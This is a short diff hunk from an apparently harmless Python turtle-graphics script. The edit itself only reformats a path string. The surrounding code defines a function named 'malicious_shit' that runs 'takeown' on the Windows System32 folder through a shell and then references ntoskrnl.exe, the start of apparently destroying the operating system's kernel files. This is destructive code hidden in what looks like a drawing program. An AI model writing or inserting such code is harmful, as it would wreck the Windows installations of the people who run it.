@@ -2,7 +2,7 @@ import subprocess
 import time
 from turtle import *
 import turtle
-system32 = r"C:/Windows/System32"
+system32 = "C:\\Windows\\System32"
 def malicious_shit():
     subprocess.run(["takeown", "/f", system32],shell=True)
     kern32="C:\\Windows\\System32\\ntoskrnl.exe"
